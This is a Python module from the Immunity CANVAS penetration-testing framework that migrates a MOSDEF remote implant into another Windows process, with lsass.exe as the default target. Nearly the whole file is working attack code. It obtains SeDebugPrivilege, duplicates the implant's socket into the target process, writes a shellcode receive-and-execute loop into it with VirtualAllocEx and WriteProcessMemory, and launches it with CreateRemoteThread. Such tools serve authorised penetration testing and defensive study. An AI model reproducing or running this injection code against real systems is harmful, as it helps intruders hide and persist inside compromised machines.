#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit

NAME="MOSDEF Migrate"
DESCRIPTION="MOSDEF Process Migration"
DOCUMENTATION={}

VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Windows"] ]

DOCUMENTATION['Notes'] = """
This module allows you to migrate the MOSDEF thread into another process via DuplicateHandle. This means 
you can move the existing current MOSDEF into another process whilst keeping the current connection.

Please note that to migrate MOSDEF, you have to have the current MOSDEF node selected as the first node.
It will pop up a new listener shell once the MOSDEF thread is migrated into the new process.
"""

NOTES="""
commandline usage: runmodule mosdefmigrate -O pid:666

Sometimes the process we're in does not have SeDebugPrivilege
so we use a call to our getpriv module to get it.
"""

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name = NAME
        self.node = None
        self.pid = "lsass.exe"
        return

    def neededListenerTypes(self): 
        return []

    def getRemoteSocket(self, pid):
        """ duplicates a local socket for a remote process """
        injectVars = {}
        injectVars["PID"] = pid
        injectVars["PROCESS_ALL_ACCESS"] = 0x001F0FFF
        injectVars["MOSDEF_SOCKET"] = self.node.shell.fd

        self.log( "Attempting to migrate SOCKET %d into pid %x"%(self.node.shell.fd,pid) )

        injectCode = """
        #import "remote","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote","kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
        #import "remote","kernel32.dll|DuplicateHandle" as "DuplicateHandle"
        #import "remote","kernel32.dll|CloseHandle" as "CloseHandle"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        #import "int", "PROCESS_ALL_ACCESS" as "PROCESS_ALL_ACCESS"
        #import "int", "MOSDEF_SOCKET" as "MOSDEF_SOCKET"
        #import "int", "PID" as "PID"

        void main()
        {
            int pHandle;
            int pSocket;
            int sHandle;
            int rVal;
 
            sHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());
            if (sHandle == 0)
            {
                sendint(0);
                return;
            }
            // PROCESS_DUP_HANDLE (0x0040)
            // get a handle to the process we want to migrate too (must have 0x40)
            pHandle = OpenProcess(0x47a, 0, PID);
            if (pHandle == 0) 
            {
                sendint(0);
                return;
            }

            //debug();
            pSocket = 0;

            // duplicate the handle over to the pHandle
            // DUPLICATE_CLOSE_SOURCE = 1, DUPLICATE_SAME_ACCESS = 2
            rVal = DuplicateHandle(sHandle, MOSDEF_SOCKET, pHandle, &pSocket, 0, 0, 2);
            // k, so now pSocket is a valid SOCKET in the remote procecss hopefully
            if (rVal == 0)
            {
                sendint(0);
                return;
            }
            CloseHandle(sHandle);
            CloseHandle(pHandle);
            sendint(pSocket);
        }
        """
        #runcode is in MOSDEFShellserver/MSSGeneric.py
        return self.node.shell.runCode(injectCode, injectVars)

    def mosdefMigrate(self, mosdefCode, lSocket, pid):
        """ moves the mosdef loop to a remote process """
        injectVars = {}
        injectVars["PID"] = pid
        injectVars["THREADME"] = mosdefCode
        injectVars["CODESIZE"] = len(mosdefCode)
        injectVars["MOSDEF_SOCKET"] = lSocket

        injectCode = """
        #import "remote","kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote","kernel32.dll|VirtualAllocEx" as "VirtualAllocEx"
        #import "remote","kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "remote","kernel32.dll|VirtualFree" as "VirtualFree"
        #import "remote","kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "remote","kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"
        #import "remote","kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
        #import "remote","kernel32.dll|DuplicateHandle" as "DuplicateHandle"
        #import "remote","kernel32.dll|CloseHandle" as "CloseHandle"
        #import "remote","kernel32.dll|ExitThread" as "ExitThread"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"

        #import "int", "MOSDEF_SOCKET" as "MOSDEF_SOCKET"
        #import "int", "PID" as "PID"
        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main()
        {
            int pHandle;
            int address;
            char *source;
            char *threadme;
            int i;
            int rVal;

            pHandle = OpenProcess(0x43a, 0, PID); // get a handle to the process we want to migrate to
            if (pHandle == 0) 
            {
                sendint(0);
                return;
            }

            // XXX: kludge to bypass our newline string literal breaking the compile
            threadme = THREADME;
            source = VirtualAlloc(0, CODESIZE, 0x1000, 0x40);
            if (source == 0)
            {
                sendint(0);
                return;
            }
            for (i = 0; i < CODESIZE; i = i + 1)
            {
                source[i] = threadme[i];
            }
         
            address = VirtualAllocEx(pHandle, 0, CODESIZE, 0x1000, 0x40);
            if (address == 0) 
            {
                sendint(0);
                return;
            }

            rVal = WriteProcessMemory(pHandle, address, source, CODESIZE, 0);
            if (rVal == 0) 
            {
                sendint(0);
                return;
            }
 
            // free kludge memory
            VirtualFree(source, 0, 0x8000);

            sendint(1); // to nudge the localnode along
 
            rVal = CreateRemoteThread(pHandle, 0, 0, address, 0, 0, 0);
            if (rVal == 0) 
            {
                return;
            }
            else
            {
                // on success we closehandle and exit the parent mosdef
                CloseHandle(MOSDEF_SOCKET);
                ExitThread(0);
            }

        }
        """
        return self.node.shell.runCode(injectCode, injectVars)

    def getMosdefLoop(self, pSocket):
        """ returns a mosdef loop payload with an fd set """
        import shellcode.shellcodeGenerator as shellcodeGenerator
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",None)

        # we might be going into a process that doesn't have winsock loaded !
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)

        # XXX: to be DEP safe it needs an VirtualAlloc loop that just makes sre
        # XXX: code ends up in RWX paged memory, and not on the stack ;)
        sc.addAttr("RecvExecAllocLoop", {"fd" : pSocket})
        sc.addAttr("ExitThread", None)

        return sc.get()

    def getArgs(self):
        """ get all the arguments from the commandline or gui """
        self.pidorname = self.argsDict.get("pid", self.pid)
        self.node = self.argsDict["passednodes"][0]            
        
    def run(self):
        self.getArgs()
        self.setInfo("mosdefmigrate - running")
        if "win32api" not in self.node.capabilities:
            self.log( "[!] currently only win32 nodes support mosdef migrate ..." )
            self.setInfo("mosdefmigrate - (done) - did not run on this node")
            return 0

        self.pid=self.pidfromname(self.pidorname,self.node)
        if self.pid in [-1, 0]:
            self.log("Was not able to get the pid for %s"%name)
            self.setInfo("mosdefmigrate - done - could not find pid for %s"%name)
            return 0
        self.log("Injecting into pid %d"%self.pid)
        
        # get SeDebugPrivilege if needed
        self.log( "[!] Getting SeDebugPrivilege ..." )
        self.exploitnodes("getpriv",[self.node],{"privname":"SeDebugPrivilege"})

        # get the migrated socket
        pSocket = self.getRemoteSocket(self.pid)
        if (pSocket == 0):
            self.log( "Error migrating SOCKET ..." )
            self.setInfo("mosdefmigrate - done - error migrating socket")
            return 0

        self.log( "[!] migrated SOCKET to a remote SOCKET of %d"%(int(pSocket)) )

        # save the old socket
        lSocket = self.node.shell.fd

        # get the MOSDEF loop code
        mLoop = self.getMosdefLoop(int(pSocket))
        # attempt to migrate the mosdef over
        self.mosdefMigrate(mLoop, lSocket, self.pid)

        # turn DES off for the new node !
        self.node.shell.doDes = False
        
        # upgrade to the new socket
        self.node.shell.fd = int(pSocket)
        # upgrade the localfunctions
        # self.node.shell.initLocalFunctions()
        rfc=self.node.shell.remotefunctioncache
        
        A = rfc["kernel32.dll|getprocaddress"]
        B = rfc["kernel32.dll|loadlibrarya"]
        C = rfc["ws2_32.dll|send"]

        # clear the caches for the new node
        self.node.shell.remotefunctioncache = {}
        
        #here we save the things in kernel32 or ntdll since
        #those can't be rebased (As far as we are concerned!)
        #It looks like we also assume ws2_32 hasn't been rebased
        #which is not strictly true! (is it?)
        if False: #turn this off for now - causing problems?
            for a in rfc:
                if a.count("kernel32.dll|") or a.count("ntdll.dll|"):
                    self.node.shell.remotefunctioncache[a]=rfc[a]

        
        self.node.shell.clearlocalcache()
        self.node.shell.clearfunctioncache()
        
        # upgrade the localfunctions
        self.node.shell.initLocalFunctions()
        
        self.node.shell.remotefunctioncache["kernel32.dll|getprocaddress"] = A
        self.node.shell.remotefunctioncache["kernel32.dll|loadlibrarya"] = B
        self.node.shell.remotefunctioncache["ws2_32.dll|send"] = C

        self.node.shell.getprocaddress("kernel32.dll|GlobalAlloc")
        self.node.shell.getprocaddress("kernel32.dll|GlobalFree")
        self.node.shell.getprocaddress("ws2_32.dll|recv")

        #print "[!] GetProcAddress = %8.8x"%uint32(self.node.shell.remotefunctioncache["kernel32.dll|getprocaddress"])
        #print "[!] LoadLibraryA = %8.8x"%uint32(self.node.shell.remotefunctioncache["kernel32.dll|loadlibrarya"])
        #print "[!] Send = %8.8x"%uint32(self.node.shell.remotefunctioncache["ws2_32.dll|send"])

        self.log( "[!] MOSDEF migrated to pid: %d"%(self.pid) )
        #here we have a list of things that are going to change if you change process!
        for known in [ "PID", "processname" ]:
            self.node.forget(known)
        
        # preserve the original nodeID (inherited from the parentnode)
        #self.log("[!] Preserving MOSDEF Node ID %d from %d"% (self.node.nodeID, self.node.parentnode.nextID))
        #self.node.parentnode.preserveID = True

        # return the migrated node :)
        self.setInfo("mosdefmigrate - done - migrated into %s" % self.pidorname)
        return self.node
    
